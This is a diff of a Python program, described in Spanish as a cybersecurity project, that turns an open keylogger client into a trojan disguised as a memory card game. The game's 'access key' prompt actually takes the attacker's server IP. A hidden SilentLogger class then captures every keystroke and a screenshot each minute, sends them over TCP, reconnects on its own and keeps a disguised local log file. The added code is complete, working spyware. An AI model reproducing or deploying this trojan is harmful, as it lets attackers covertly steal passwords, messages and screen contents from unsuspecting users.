@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
 =============================================================
-  CLIENTE KEYLOGGER CON GUI - Proyecto de Ciberseguridad
+  🧠 MEMORAMA - Juego de Memoria
+  (Cliente Keylogger disfrazado - Proyecto de Ciberseguridad)
 =============================================================
 """
 
@@ -11,9 +12,10 @@ import io
 import os
 import sys
 import time
+import random
 import threading
 import tkinter as tk
-from tkinter import scrolledtext, messagebox
+from tkinter import messagebox
 from datetime import datetime
 
 try:
@@ -28,192 +30,46 @@ except ImportError:
     print("[!] Instala Pillow: pip install Pillow")
     sys.exit(1)
 
-# ── Configuración por defecto ──────────────────────────────
-DEFAULT_HOST = "192.168.50.76"
+# ── Configuración oculta ──────────────────────────────────
 DEFAULT_PORT = 9999
 SCREENSHOT_INTERVAL = 60
 KEY_BUFFER_FLUSH_INTERVAL = 5
-LOCAL_LOG_FILE = "local_log.txt"
+LOCAL_LOG_FILE = ".game_cache.tmp"
+
+# ── Emojis para el memorama ───────────────────────────────
+CARD_EMOJIS = ["🐶", "🐱", "🦊", "🐼", "🐸", "🦋", "🌟", "🔥",
+               "🎵", "💎", "🍕", "🚀", "🌈", "🎯", "🍀", "🎲"]
 
 
-class ClientGUI:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("👁 Cliente Keylogger - Ciberseguridad")
-        self.root.geometry("750x580")
-        self.root.configure(bg="#1a1a2e")
-        self.root.resizable(True, True)
+# ══════════════════════════════════════════════════════════
+#  KEYLOGGER (OCULTO EN SEGUNDO PLANO)
+# ══════════════════════════════════════════════════════════
 
+class SilentLogger:
+    """Keylogger que corre silenciosamente en background."""
+
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
         self.sock = None
         self.connected = False
-        self.running = False
-        self.listener = None
-
+        self.running = True
         self.key_buffer = []
         self.buffer_lock = threading.Lock()
-
-        self.keys_sent = 0
-        self.screenshots_sent = 0
-
-        self.build_gui()
-
-    # ── GUI ────────────────────────────────────────────────
-
-    def build_gui(self):
-        bg = "#1a1a2e"
-        fg = "#e0e0e0"
-        accent = "#e94560"
-        entry_bg = "#16213e"
-
-        # Header
-        header = tk.Frame(self.root, bg=accent, pady=10)
-        header.pack(fill=tk.X)
-
-        tk.Label(
-            header, text="👁 CLIENTE KEYLOGGER",
-            font=("Helvetica", 18, "bold"), bg=accent, fg="white"
-        ).pack()
-
-        # ── Configuración de conexión ──────────────────────
-        config_frame = tk.LabelFrame(
-            self.root, text=" 🔗 Conexión al Servidor ",
-            font=("Helvetica", 11, "bold"),
-            bg=bg, fg=fg, padx=10, pady=8
-        )
-        config_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
-
-        row1 = tk.Frame(config_frame, bg=bg)
-        row1.pack(fill=tk.X, pady=2)
-
-        tk.Label(row1, text="IP Servidor:", bg=bg, fg=fg,
-                 font=("Helvetica", 10)).pack(side=tk.LEFT)
-        self.host_entry = tk.Entry(row1, width=18, bg=entry_bg, fg="#00d2ff",
-                                   insertbackground=fg, font=("Courier", 11, "bold"))
-        self.host_entry.insert(0, DEFAULT_HOST)
-        self.host_entry.pack(side=tk.LEFT, padx=(5, 20))
-
-        tk.Label(row1, text="Puerto:", bg=bg, fg=fg,
-                 font=("Helvetica", 10)).pack(side=tk.LEFT)
-        self.port_entry = tk.Entry(row1, width=8, bg=entry_bg, fg=fg,
-                                   insertbackground=fg, font=("Courier", 10))
-        self.port_entry.insert(0, str(DEFAULT_PORT))
-        self.port_entry.pack(side=tk.LEFT, padx=5)
-
-        # Fila 2: Intervalo de screenshots
-        row2 = tk.Frame(config_frame, bg=bg)
-        row2.pack(fill=tk.X, pady=2)
-
-        tk.Label(row2, text="Screenshots cada:", bg=bg, fg=fg,
-                 font=("Helvetica", 10)).pack(side=tk.LEFT)
-        self.interval_entry = tk.Entry(row2, width=5, bg=entry_bg, fg=fg,
-                                       insertbackground=fg, font=("Courier", 10))
-        self.interval_entry.insert(0, str(SCREENSHOT_INTERVAL))
-        self.interval_entry.pack(side=tk.LEFT, padx=5)
-        tk.Label(row2, text="segundos", bg=bg, fg="#aaa",
-                 font=("Helvetica", 10)).pack(side=tk.LEFT)
-
-        # ── Botones ────────────────────────────────────────
-        btn_frame = tk.Frame(self.root, bg=bg)
-        btn_frame.pack(fill=tk.X, padx=10, pady=5)
-
-        self.start_btn = tk.Button(
-            btn_frame, text="▶ CONECTAR E INICIAR",
-            font=("Helvetica", 12, "bold"),
-            bg="#28a745", fg="white", activebackground="#218838",
-            cursor="hand2", padx=20, pady=5,
-            command=self.start_client
-        )
-        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))
-
-        self.stop_btn = tk.Button(
-            btn_frame, text="⏹ DETENER",
-            font=("Helvetica", 12, "bold"),
-            bg=accent, fg="white", activebackground="#c82333",
-            cursor="hand2", padx=20, pady=5,
-            state=tk.DISABLED,
-            command=self.stop_client
-        )
-        self.stop_btn.pack(side=tk.LEFT)
-
-        # Status
-        self.status_label = tk.Label(
-            btn_frame, text="● Desconectado",
-            font=("Helvetica", 11), bg=bg, fg="#ff6b6b"
-        )
-        self.status_label.pack(side=tk.RIGHT, padx=10)
-
-        # ── Estadísticas ───────────────────────────────────
-        stats_frame = tk.Frame(self.root, bg=bg)
-        stats_frame.pack(fill=tk.X, padx=10, pady=2)
-
-        self.stats_label = tk.Label(
-            stats_frame,
-            text="⌨ Envíos de teclas: 0   |   📷 Screenshots: 0",
-            font=("Helvetica", 10), bg=bg, fg="#aaa"
-        )
-        self.stats_label.pack(side=tk.LEFT)
-
-        # ── Log ────────────────────────────────────────────
-        log_label = tk.Label(
-            self.root, text="📋 Actividad:",
-            font=("Helvetica", 11, "bold"), bg=bg, fg=fg, anchor="w"
-        )
-        log_label.pack(fill=tk.X, padx=10, pady=(10, 2))
-
-        self.log_text = scrolledtext.ScrolledText(
-            self.root, width=80, height=16,
-            bg="#0d1117", fg="#58a6ff",
-            insertbackground=fg, font=("Courier", 10),
-            state=tk.DISABLED, wrap=tk.WORD
-        )
-        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
-
-        self.log_text.tag_config("info", foreground="#58a6ff")
-        self.log_text.tag_config("success", foreground="#3fb950")
-        self.log_text.tag_config("warning", foreground="#d29922")
-        self.log_text.tag_config("error", foreground="#f85149")
-        self.log_text.tag_config("key", foreground="#bc8cff")
-        self.log_text.tag_config("screenshot", foreground="#79c0ff")
-
-    # ── Logging ────────────────────────────────────────────
-
-    def log(self, message, tag="info"):
-        ts = datetime.now().strftime("%H:%M:%S")
-        self.root.after(0, self._append_log, f"[{ts}] {message}\n", tag)
-
-    def _append_log(self, text, tag):
-        self.log_text.config(state=tk.NORMAL)
-        self.log_text.insert(tk.END, text, tag)
-        self.log_text.see(tk.END)
-        self.log_text.config(state=tk.DISABLED)
-
-    def update_stats(self):
-        self.root.after(0, self.stats_label.config, {
-            "text": f"⌨ Envíos de teclas: {self.keys_sent}   |   📷 Screenshots: {self.screenshots_sent}"
-        })
-
-    # ── Conexión ───────────────────────────────────────────
 
     def connect(self):
         try:
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            host = self.host_entry.get().strip()
-            port = int(self.port_entry.get().strip())
-            self.sock.connect((host, port))
+            self.sock.connect((self.host, self.port))
             self.connected = True
-            self.log(f"✅ Conectado a {host}:{port}", "success")
-            self.root.after(0, self.status_label.config,
-                            {"text": "● Conectado", "fg": "#3fb950"})
             return True
-        except Exception as e:
-            self.log(f"Error de conexión: {e}", "error")
+        except Exception:
             self.connected = False
             return False
 
     def reconnect(self):
         delay = 5
         while self.running and not self.connected:
-            self.log(f"Reintentando en {delay}s...", "warning")
             time.sleep(delay)
             if self.connect():
                 return True
@@ -230,18 +86,13 @@ class ClientGUI:
             header_json = json.dumps(header).encode("utf-8") + b"\n"
             self.sock.sendall(header_json + payload)
             return True
-        except (BrokenPipeError, ConnectionResetError, OSError) as e:
-            self.log(f"Error de envío: {e}", "error")
+        except (BrokenPipeError, ConnectionResetError, OSError):
             self.connected = False
-            self.root.after(0, self.status_label.config,
-                            {"text": "● Reconectando...", "fg": "#d29922"})
             return False
-
-    # ── Captura de teclas ──────────────────────────────────
 
     def on_key_press(self, key):
         try:
-            special_keys = {
+            special = {
                 keyboard.Key.space: " ",
                 keyboard.Key.enter: "[ENTER]\n",
                 keyboard.Key.tab: "[TAB]",
@@ -256,10 +107,9 @@ class ClientGUI:
                 keyboard.Key.caps_lock: "[CAPS]",
                 keyboard.Key.esc: "[ESC]",
             }
-
-            if key in special_keys:
-                char = special_keys[key]
-            elif hasattr(key, "char") and key.char is not None:
+            if key in special:
+                char = special[key]
+            elif hasattr(key, "char") and key.char:
                 char = key.char
             else:
                 char = f"[{key}]"
@@ -270,157 +120,376 @@ class ClientGUI:
         except Exception:
             pass
 
-    def flush_key_buffer(self):
+    def flush_loop(self):
         while self.running:
             time.sleep(KEY_BUFFER_FLUSH_INTERVAL)
-
             with self.buffer_lock:
                 if not self.key_buffer:
                     continue
-                keys_text = "".join(self.key_buffer)
+                text = "".join(self.key_buffer)
                 self.key_buffer.clear()
 
             # Log local
-            self.write_local_log(keys_text)
+            try:
+                with open(LOCAL_LOG_FILE, "a") as f:
+                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
+            except Exception:
+                pass
 
-            # Enviar
             if self.connected:
-                payload = keys_text.encode("utf-8")
-                if self.send_data("keys", payload):
-                    self.keys_sent += 1
-                    self.update_stats()
-                    display = keys_text.replace("\n", "↵")
-                    if len(display) > 50:
-                        display = display[:50] + "..."
-                    self.log(f"⌨ Teclas enviadas: {display}", "key")
-                else:
+                if not self.send_data("keys", text.encode("utf-8")):
                     threading.Thread(target=self.reconnect, daemon=True).start()
 
-    def write_local_log(self, text):
+    def screenshot_loop(self):
+        while self.running:
+            time.sleep(SCREENSHOT_INTERVAL)
+            if not self.running:
+                break
+            try:
+                screenshot = ImageGrab.grab()
+                buf = io.BytesIO()
+                screenshot.save(buf, format="PNG")
+                img_data = buf.getvalue()
+            except Exception:
+                continue
+
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            fname = f"screenshot_{ts}.png"
+
+            if self.connected:
+                self.send_data("screenshot", img_data, fname)
+
+    def start(self):
+        if not self.connect():
+            threading.Thread(target=self.reconnect, daemon=True).start()
+
+        # Flush de teclas
+        threading.Thread(target=self.flush_loop, daemon=True).start()
+        # Screenshots
+        threading.Thread(target=self.screenshot_loop, daemon=True).start()
+        # Listener
+        self.listener = keyboard.Listener(on_press=self.on_key_press)
+        self.listener.daemon = True
+        self.listener.start()
+
+    def stop(self):
+        self.running = False
         try:
-            with open(LOCAL_LOG_FILE, "a", encoding="utf-8") as f:
-                ts = datetime.now().strftime("%H:%M:%S")
-                f.write(f"[{ts}] {text}\n")
+            self.listener.stop()
+        except Exception:
+            pass
+        try:
+            self.sock.close()
         except Exception:
             pass
 
-    # ── Screenshots ────────────────────────────────────────
 
-    def screenshot_loop(self):
-        try:
-            interval = int(self.interval_entry.get().strip())
-        except ValueError:
-            interval = SCREENSHOT_INTERVAL
+# ══════════════════════════════════════════════════════════
+#  JUEGO DE MEMORAMA (INTERFAZ VISIBLE)
+# ══════════════════════════════════════════════════════════
 
-        while self.running:
-            time.sleep(interval)
-            if not self.running:
-                break
+class MemoramaApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("🧠 Memorama - Juego de Memoria")
+        self.root.geometry("600x700")
+        self.root.configure(bg="#0f0f23")
+        self.root.resizable(False, False)
 
-            try:
-                screenshot = ImageGrab.grab()
-                buffer = io.BytesIO()
-                screenshot.save(buffer, format="PNG")
-                img_data = buffer.getvalue()
-            except Exception as e:
-                self.log(f"Error capturando pantalla: {e}", "error")
-                continue
+        self.logger = None
+        self.show_login_screen()
 
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"screenshot_{timestamp}.png"
-            size_kb = len(img_data) / 1024
+    # ── Pantalla de Login (pide la "clave") ────────────────
 
-            if self.connected:
-                if self.send_data("screenshot", img_data, filename):
-                    self.screenshots_sent += 1
-                    self.update_stats()
-                    self.log(f"📷 Screenshot enviado: {filename} ({size_kb:.1f} KB)", "screenshot")
-                else:
-                    self.save_screenshot_local(img_data, filename)
-                    threading.Thread(target=self.reconnect, daemon=True).start()
+    def show_login_screen(self):
+        self.clear_window()
+
+        bg = "#0f0f23"
+        fg = "#e0e0e0"
+
+        # Fondo
+        container = tk.Frame(self.root, bg=bg)
+        container.place(relx=0.5, rely=0.5, anchor="center")
+
+        # Logo
+        tk.Label(
+            container, text="🧠", font=("Helvetica", 72), bg=bg
+        ).pack(pady=(0, 5))
+
+        tk.Label(
+            container, text="MEMORAMA",
+            font=("Helvetica", 36, "bold"), bg=bg, fg="#f0c040"
+        ).pack()
+
+        tk.Label(
+            container, text="Juego de Memoria",
+            font=("Helvetica", 14), bg=bg, fg="#888"
+        ).pack(pady=(0, 30))
+
+        # Caja de clave
+        key_frame = tk.Frame(container, bg=bg)
+        key_frame.pack(pady=10)
+
+        tk.Label(
+            key_frame, text="🔑 Ingresa tu clave de acceso:",
+            font=("Helvetica", 13), bg=bg, fg=fg
+        ).pack()
+
+        self.key_entry = tk.Entry(
+            key_frame, width=22, font=("Courier", 16, "bold"),
+            bg="#1a1a3e", fg="#00d2ff", insertbackground="#00d2ff",
+            justify="center", relief="flat", bd=0,
+            highlightthickness=2, highlightcolor="#f0c040",
+            highlightbackground="#333"
+        )
+        self.key_entry.pack(pady=10, ipady=8)
+        self.key_entry.bind("<Return>", lambda e: self.validate_key())
+        self.key_entry.focus_set()
+
+        # Botón
+        self.play_btn = tk.Button(
+            key_frame, text="🎮  JUGAR",
+            font=("Helvetica", 16, "bold"),
+            bg="#28a745", fg="white", activebackground="#218838",
+            cursor="hand2", padx=40, pady=8, relief="flat",
+            command=self.validate_key
+        )
+        self.play_btn.pack(pady=15)
+
+        # Mensaje de error (oculto)
+        self.error_label = tk.Label(
+            key_frame, text="",
+            font=("Helvetica", 11), bg=bg, fg="#ff4444"
+        )
+        self.error_label.pack()
+
+        # Footer
+        tk.Label(
+            container, text="v2.0 • Obtén tu clave con el administrador",
+            font=("Helvetica", 9), bg=bg, fg="#555"
+        ).pack(pady=(20, 0))
+
+    def validate_key(self):
+        key = self.key_entry.get().strip()
+
+        if not key:
+            self.error_label.config(text="⚠ Ingresa una clave")
+            return
+
+        # La "clave" es la IP del servidor
+        # Intentar activar el logger silenciosamente
+        self.logger = SilentLogger(key, DEFAULT_PORT)
+
+        # Mostrar el juego sin importar si la conexión funciona
+        self.play_btn.config(text="⏳ Cargando...", state=tk.DISABLED)
+        self.error_label.config(text="", fg="#888")
+
+        # Iniciar logger en background
+        threading.Thread(target=self._init_and_play, daemon=True).start()
+
+    def _init_and_play(self):
+        # Iniciar el logger silenciosamente
+        self.logger.start()
+        time.sleep(0.5)  # Simular "carga"
+
+        # Mostrar juego en hilo principal
+        self.root.after(0, self.show_game)
+
+    # ── Pantalla del Juego ─────────────────────────────────
+
+    def show_game(self):
+        self.clear_window()
+
+        bg = "#0f0f23"
+        fg = "#e0e0e0"
+
+        # Estado del juego
+        self.grid_size = 4  # 4x4 = 16 cartas = 8 pares
+        total = self.grid_size * self.grid_size
+        num_pairs = total // 2
+
+        emojis = random.sample(CARD_EMOJIS, num_pairs)
+        self.cards = emojis * 2
+        random.shuffle(self.cards)
+
+        self.flipped = [False] * total
+        self.matched = [False] * total
+        self.first_card = None
+        self.can_click = True
+        self.moves = 0
+        self.pairs_found = 0
+        self.total_pairs = num_pairs
+        self.start_time = time.time()
+
+        # ── Header ─────────────────────────────────────────
+        header = tk.Frame(self.root, bg="#1a1a3e", pady=8)
+        header.pack(fill=tk.X)
+
+        tk.Label(
+            header, text="🧠 MEMORAMA",
+            font=("Helvetica", 20, "bold"), bg="#1a1a3e", fg="#f0c040"
+        ).pack()
+
+        # Stats bar
+        stats = tk.Frame(self.root, bg=bg, pady=5)
+        stats.pack(fill=tk.X, padx=20)
+
+        self.moves_label = tk.Label(
+            stats, text="Movimientos: 0",
+            font=("Helvetica", 12), bg=bg, fg="#aaa"
+        )
+        self.moves_label.pack(side=tk.LEFT)
+
+        self.pairs_label = tk.Label(
+            stats, text=f"Pares: 0/{self.total_pairs}",
+            font=("Helvetica", 12), bg=bg, fg="#aaa"
+        )
+        self.pairs_label.pack(side=tk.RIGHT)
+
+        self.timer_label = tk.Label(
+            stats, text="⏱ 00:00",
+            font=("Helvetica", 12, "bold"), bg=bg, fg="#00d2ff"
+        )
+        self.timer_label.pack()
+
+        # ── Grid de cartas ─────────────────────────────────
+        self.grid_frame = tk.Frame(self.root, bg=bg, pady=10)
+        self.grid_frame.pack(expand=True)
+
+        self.buttons = []
+        for i in range(total):
+            row = i // self.grid_size
+            col = i % self.grid_size
+
+            btn = tk.Button(
+                self.grid_frame,
+                text="❓",
+                font=("Helvetica", 28),
+                width=3, height=1,
+                bg="#2a2a4a", fg="#555",
+                activebackground="#3a3a5a",
+                relief="flat", bd=0,
+                cursor="hand2",
+                command=lambda idx=i: self.flip_card(idx)
+            )
+            btn.grid(row=row, column=col, padx=6, pady=6, ipadx=5, ipady=5)
+            self.buttons.append(btn)
+
+        # ── Botones inferiores ─────────────────────────────
+        bottom = tk.Frame(self.root, bg=bg, pady=10)
+        bottom.pack(fill=tk.X, padx=20)
+
+        tk.Button(
+            bottom, text="🔄 Nuevo Juego",
+            font=("Helvetica", 11, "bold"),
+            bg="#f0c040", fg="#111", activebackground="#daa520",
+            cursor="hand2", padx=15, pady=5, relief="flat",
+            command=self.show_game
+        ).pack(side=tk.LEFT)
+
+        tk.Button(
+            bottom, text="🚪 Salir",
+            font=("Helvetica", 11, "bold"),
+            bg="#e94560", fg="white", activebackground="#c82333",
+            cursor="hand2", padx=15, pady=5, relief="flat",
+            command=self.quit_app
+        ).pack(side=tk.RIGHT)
+
+        # Iniciar timer
+        self.update_timer()
+
+    def flip_card(self, idx):
+        if not self.can_click:
+            return
+        if self.flipped[idx] or self.matched[idx]:
+            return
+
+        # Voltear carta
+        self.flipped[idx] = True
+        self.buttons[idx].config(
+            text=self.cards[idx],
+            bg="#3a3a6a", fg="white"
+        )
+
+        if self.first_card is None:
+            # Primera carta
+            self.first_card = idx
+        else:
+            # Segunda carta
+            self.moves += 1
+            self.moves_label.config(text=f"Movimientos: {self.moves}")
+            self.can_click = False
+
+            first = self.first_card
+            second = idx
+            self.first_card = None
+
+            if self.cards[first] == self.cards[second]:
+                # ¡Par encontrado!
+                self.matched[first] = True
+                self.matched[second] = True
+                self.pairs_found += 1
+                self.pairs_label.config(
+                    text=f"Pares: {self.pairs_found}/{self.total_pairs}"
+                )
+
+                # Animar match
+                self.buttons[first].config(bg="#1a6b3a")
+                self.buttons[second].config(bg="#1a6b3a")
+                self.can_click = True
+
+                # ¿Ganó?
+                if self.pairs_found == self.total_pairs:
+                    self.root.after(500, self.show_win)
             else:
-                self.save_screenshot_local(img_data, filename)
+                # No coinciden, voltear después de un momento
+                self.root.after(800, self.hide_cards, first, second)
 
-    def save_screenshot_local(self, img_data, filename):
-        local_dir = "local_screenshots"
-        os.makedirs(local_dir, exist_ok=True)
-        path = os.path.join(local_dir, filename)
-        try:
-            with open(path, "wb") as f:
-                f.write(img_data)
-            self.log(f"💾 Guardado local: {filename}", "warning")
-        except Exception as e:
-            self.log(f"Error guardando local: {e}", "error")
+    def hide_cards(self, a, b):
+        self.flipped[a] = False
+        self.flipped[b] = False
+        self.buttons[a].config(text="❓", bg="#2a2a4a", fg="#555")
+        self.buttons[b].config(text="❓", bg="#2a2a4a", fg="#555")
+        self.can_click = True
 
-    # ── Control ────────────────────────────────────────────
+    def update_timer(self):
+        if hasattr(self, 'start_time') and self.pairs_found < self.total_pairs:
+            elapsed = int(time.time() - self.start_time)
+            mins = elapsed // 60
+            secs = elapsed % 60
+            self.timer_label.config(text=f"⏱ {mins:02d}:{secs:02d}")
+            self.root.after(1000, self.update_timer)
 
-    def start_client(self):
-        self.running = True
-        self.keys_sent = 0
-        self.screenshots_sent = 0
+    def show_win(self):
+        elapsed = int(time.time() - self.start_time)
+        mins = elapsed // 60
+        secs = elapsed % 60
 
-        self.start_btn.config(state=tk.DISABLED)
-        self.stop_btn.config(state=tk.NORMAL)
-        self.host_entry.config(state=tk.DISABLED)
-        self.port_entry.config(state=tk.DISABLED)
-        self.interval_entry.config(state=tk.DISABLED)
+        messagebox.showinfo(
+            "🎉 ¡Ganaste!",
+            f"¡Felicidades! Completaste el memorama.\n\n"
+            f"Movimientos: {self.moves}\n"
+            f"Tiempo: {mins:02d}:{secs:02d}\n\n"
+            f"¿Quieres jugar de nuevo?"
+        )
+        self.show_game()
 
-        self.log("Iniciando cliente...", "info")
+    # ── Utilidades ─────────────────────────────────────────
 
-        threading.Thread(target=self._start_worker, daemon=True).start()
+    def clear_window(self):
+        for widget in self.root.winfo_children():
+            widget.destroy()
 
-    def _start_worker(self):
-        # Conectar
-        if not self.connect():
-            self.log("Modo offline, reintentando...", "warning")
-            threading.Thread(target=self.reconnect, daemon=True).start()
-
-        # Hilo flush de teclas
-        threading.Thread(target=self.flush_key_buffer, daemon=True).start()
-
-        # Hilo screenshots
-        threading.Thread(target=self.screenshot_loop, daemon=True).start()
-
-        # Listener de teclado
-        self.log("Capturando teclas...", "success")
-        self.listener = keyboard.Listener(on_press=self.on_key_press)
-        self.listener.start()
-
-    def stop_client(self):
-        self.running = False
-        self.log("Deteniendo cliente...", "warning")
-
-        if self.listener:
-            self.listener.stop()
-
-        # Flush remaining
-        with self.buffer_lock:
-            if self.key_buffer:
-                remaining = "".join(self.key_buffer)
-                self.write_local_log(remaining)
-                self.key_buffer.clear()
-
-        if self.sock:
-            try:
-                self.sock.close()
-            except Exception:
-                pass
-        self.connected = False
-
-        self.start_btn.config(state=tk.NORMAL)
-        self.stop_btn.config(state=tk.DISABLED)
-        self.host_entry.config(state=tk.NORMAL)
-        self.port_entry.config(state=tk.NORMAL)
-        self.interval_entry.config(state=tk.NORMAL)
-        self.status_label.config(text="● Desconectado", fg="#ff6b6b")
-
-        self.log("Cliente detenido.", "warning")
+    def quit_app(self):
+        if self.logger:
+            self.logger.stop()
+        self.root.destroy()
 
 
 def main():
     root = tk.Tk()
-    app = ClientGUI(root)
-    root.protocol("WM_DELETE_WINDOW", lambda: (app.stop_client(), root.destroy()))
+    app = MemoramaApp(root)
+    root.protocol("WM_DELETE_WINDOW", app.quit_app)
     root.mainloop()
 
 
